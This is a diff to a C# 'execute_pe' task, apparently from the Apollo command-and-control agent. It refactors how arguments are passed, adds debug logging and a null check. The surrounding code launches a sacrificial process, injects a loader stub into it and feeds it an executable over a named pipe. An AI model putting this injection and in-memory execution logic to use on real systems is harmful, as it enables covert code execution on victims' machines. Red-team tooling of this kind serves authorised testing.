@@ -22,6 +22,7 @@ using System.IO.Pipes;
 using ApolloInterop.Structs.ApolloStructs;
 using ApolloInterop.Classes.Core;
 using ApolloInterop.Classes.Collections;
+using ApolloInterop.Utils;
 
 namespace Tasks
 {
@@ -35,7 +36,7 @@ namespace Tasks
             [DataMember(Name = "pe_name")]
             public string PEName;
             [DataMember(Name = "pe_arguments")]
-            public string PEArguments;
+            public string[] PEArgumentsArray;
             [DataMember(Name = "loader_stub_id")]
             public string LoaderStubId;
             [DataMember(Name = "pe_id")]
@@ -117,15 +118,16 @@ namespace Tasks
             Process proc = null;
             try
             {
+                DebugHelp.DebugWriteLine("Starting execute_pe task");
+                DebugHelp.DebugWriteLine($"Task Parameters: {_data.Parameters}");
                 ExecutePEParameters parameters = _jsonSerializer.Deserialize<ExecutePEParameters>(_data.Parameters);
-                if (string.IsNullOrEmpty(parameters.LoaderStubId) ||
-                    string.IsNullOrEmpty(parameters.PEName) ||
-                    string.IsNullOrEmpty(parameters.PipeName))
+                string peArguments = string.Join(" ", parameters.PEArgumentsArray);
+                peArguments = $"\"{peArguments}\"";
+                DebugHelp.DebugWriteLine($"pe args: {peArguments}");
+
+                if (string.IsNullOrEmpty(parameters.LoaderStubId) || string.IsNullOrEmpty(parameters.PEName) || string.IsNullOrEmpty(parameters.PipeName))
                 {
-                    resp = CreateTaskResponse(
-                        $"One or more required arguments was not provided.",
-                        true,
-                        "error");
+                    resp = CreateTaskResponse($"One or more required arguments was not provided.", true,"error");
                 }
                 else
                 {
@@ -146,20 +148,15 @@ namespace Tasks
                         _agent.GetFileManager().GetFileFromStore(parameters.PEName, out peBytes);
                     }
 
-
-                    if (peBytes.Length > 0)
+                    if (peBytes != null && peBytes.Length > 0)
                     {
-                        if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.LoaderStubId,
-                                out byte[] exePEPic))
+                        if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.LoaderStubId,out byte[] exePEPic))
                         {
                             ApplicationStartupInfo info = _agent.GetProcessManager().GetStartupInfo(true);
                             proc = _agent.GetProcessManager().NewProcess(info.Application, info.Arguments, true);
                             if (proc.Start())
                             {
-                                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
-                                    "",
-                                    false,
-                                    "",
+                                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("", false, "",
                                     new IMythicMessage[]
                                     {
                                         Artifact.ProcessCreate((int) proc.PID, info.Application, info.Arguments)
@@ -167,20 +164,19 @@ namespace Tasks
                                 ));
                                 if (proc.Inject(exePEPic))
                                 {
-                                    _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
-                                        "",
-                                        false,
-                                        "",
+                                    _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("",false, "",
                                         new IMythicMessage[]
                                         {
                                             Artifact.ProcessInject((int) proc.PID,
                                                 _agent.GetInjectionManager().GetCurrentTechnique().Name)
-                                        }));
+                                        }
+                                    ));
                                     IPCCommandArguments cmdargs = new IPCCommandArguments
                                     {
                                         ByteData = peBytes,
-                                        StringData = $"{parameters.PEName} {parameters.PEArguments}"
+                                        StringData = $"{parameters.PEName} {peArguments}"
                                     };
+                                    DebugHelp.DebugWriteLine($"string data: {cmdargs.StringData}");
                                     AsyncNamedPipeClient client = new AsyncNamedPipeClient("127.0.0.1", parameters.PipeName);
                                     client.ConnectionEstablished += Client_ConnectionEstablished;
                                     client.MessageReceived += Client_MessageReceived;
@@ -230,7 +226,7 @@ namespace Tasks
                     else
                     {
                         resp = CreateTaskResponse(
-                            $"{parameters.PEName} is not loaded or is of zero length (have you registered it?)", true);
+                            $"{parameters.PEName} is not loaded or is of zero length (have you registered it?)", true,"error");
                     }
                 }
             }
